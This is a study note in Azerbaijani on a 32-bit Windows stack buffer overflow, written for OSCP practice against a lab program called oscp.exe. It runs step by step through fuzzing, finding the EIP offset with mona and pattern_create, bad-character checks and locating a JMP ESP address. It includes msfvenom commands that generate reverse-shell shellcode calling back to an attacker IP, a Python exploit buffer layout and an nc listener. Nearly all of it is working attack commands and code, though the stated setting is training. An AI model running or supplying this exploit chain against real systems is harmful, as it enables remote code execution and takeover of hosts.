# BufferOverflow


### Tipləri
  - Stack-Based Buffer Overflow
  - Heap-Based Buffer Overflow
  - Format String Attack
  - Integer Overflow

#### Stac-Based

ESP: Stack pointer. Stack veri yapısının LIFO (Last In Firs Out) son giren yani ilk çıkacak elemanı gösterir.Bir nevi üst sınır.  
EBP: Stacktaki ilk giren elemanı işaret eder. Bir nevi altsınır.  
EIP: Instruction pointer olarak geçmektedir.CPU’nun an itibariyle code segment’i içerisindeki hangi instruction’i çalıştıracağını gösterir.  

EIP - ə istədiyimiz funksiyanın return adresini yazdıqda bu funksiyadan ora sıçrayacaqş Bunun üçündə ESP sayını və EBP (8 bayt) -i doldururuq və EIP -yə dönəcəyimiz (return) adresi verəcəyik oradakı funksiyanı işlədirik.


/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600

!mona findmsp -distance 600

!mona bytearray -b "\x00"

!mona compare -f bytearray.bin -a <ESP address>

!mona jmp -r esp -cpb "\x00"



shell
msfvenom -p windows/shell_reverse_tcp LHOST=10.8.80.149 LPORT=7777 EXITFUNC=thread -b "\x00\xa9\xcd\xd4" -f c

------------------------------------------------------------

https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst

------------------------------------------------------------

# Stack-Based Buffer Overflow – Full Walkthrough (OSCP / PWK)

Bu sənəd **32-bit Windows stack-based buffer overflow** zəifliyinin
tapılması və exploit olunmasını **sıfırdan sona qədər** izah edir.
Metodologiya **OSCP (PWK)** imtahanı və real laboratoriyalar üçün tam uyğundur.

---

## 🎯 Məqsəd

- Zəif proqramda buffer overflow yaratmaq
- **EIP** üzərində tam nəzarət əldə etmək
- Shellcode icra etdirərək **reverse shell** almaq

---

## 🧱 Lab Mühiti

### Windows VM
- Windows 7 (32-bit)
- Immunity Debugger + mona
- Firewall və Defender deaktivdir
- User: `admin`
- Password: `password`
- Zəif proqram: `oscp.exe`
- Dinlədiyi port: **1337**

### Kali Linux
- Fuzzing və exploit yazmaq üçün istifadə olunur

---

## 1️⃣ Proqramın Immunity Debugger ilə Açılması

> Immunity Debugger **mütləq Administrator olaraq** açılmalıdır.

```
File → Open → vulnerable-apps/oscp/oscp.exe
```

Proqram paused vəziyyətdə açılır.  
**Run (F9)** basaraq işə sal.

Terminalda görünür:
```
Listening on port 1337
```

---

## 2️⃣ Proqramla Əlaqənin Test Edilməsi

Kali Linux-da:
```bash
nc MACHINE_IP 1337
```

Daxil et:
```
HELP
OVERFLOW1 test
```

Cavab:
```
OVERFLOW1 COMPLETE
```

Bu o deməkdir ki `OVERFLOW1` input qəbul edir və overflow üçün uyğundur.

---

## 3️⃣ Mona Konfiqurasiyası

Mona üçün working folder təyin edilir:

```
!mona config -set workingfolder c:\mona\%p
```

Yaradılan qovluq:
```
C:\mona\oscp\
```

---

## 4️⃣ Fuzzing – Proqramı Çökdürmək

### Məqsəd
- Proqramın neçə byte-dan sonra crash etdiyini tapmaq

### Fuzzer Məntiqi
- `OVERFLOW1 AAAAA...`
- Hər iterasiyada 100 byte artırılır
- Proqram crash olanda dayanır

Crash mesajı:
```
Fuzzing crashed at 600 bytes
```

📌 Bu dəyəri qeyd et (məsələn: **600**)

---

## 5️⃣ EIP Offset-in Tapılması

### Pattern Yaratmaq
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600
```

Yaradılan pattern `payload` yerinə yazılır və exploit işə salınır.

### Offset Tapmaq
Immunity Debugger-də:
```
!mona findmsp -distance 600
```

Nəticə:
```
EIP contains normal pattern : (offset 112)
```

📌 **EIP offset = 112**

---

## 6️⃣ EIP Üzərində Nəzarətin Təsdiqi

```python
offset = 112
overflow = "A" * offset
retn = "BBBB"
payload = ""
```

Exploit göndərildikdə:

```
EIP = 42424242
```

✅ EIP artıq tam nəzarət altındadır.

---

## 7️⃣ Bad Characters-in Tapılması

### Bytearray Yaratmaq
```
!mona bytearray -b "\x00"
```

### Badchar String
```python
\x01\x02\x03 ... \xff
```

Bu payload göndərilir və proqram crash edilir.

### Yoxlama
ESP register-in göstərdiyi ünvan istifadə olunur:
```
!mona compare -f C:\mona\oscp\bytearray.bin -a ESP_ADDRESS
```

Badchar-lar tapıldıqca:
- Bytearray yenilənir
- Payload-dan çıxarılır
- Proses təkrarlanır

Ta ki:
```
Status: Unmodified
```

---

## 8️⃣ JMP ESP Ünvanının Tapılması

```
!mona jmp -r esp -cpb "\x00\x0a\x0d"
```

Tapılan ünvan (nümunə):
```
0x625011AF
```

Exploit-də (little endian):
```python
retn = "\xAF\x11\x50\x62"
```

---

## 9️⃣ Shellcode Yaradılması

Kali Linux-da:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00\x0a\x0d" -f c
```

Yaradılan shellcode `payload` dəyişəninə əlavə edilir.

---

## 🔟 NOP Sled Əlavəsi

```python
padding = "\x90" * 16
```

NOP-lar shellcode-un stabil icrası üçündür.

---

## ✅ Final Exploit Strukturu

```python
prefix = "OVERFLOW1 "
offset = 112
overflow = "A" * offset
retn = "\xAF\x11\x50\x62"
padding = "\x90" * 16
payload = shellcode
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix
```

---

## 🐚 Exploit Etmək

Kali-də listener:
```bash
nc -lvnp 4444
```

Exploit işə salınır və nəticədə:

🎉 **Reverse shell əldə edilir**

---

## 🔥 OSCP üçün Qızıl Qaydalar

- Bütün classic BOF-lar eyni metodologiyanı izləyir
- Fuzz → Offset → Badchars → JMP → Shellcode
- Immunity Debugger həmişə Administrator
- Addım-addım və panikasız işləmək vacibdir

---

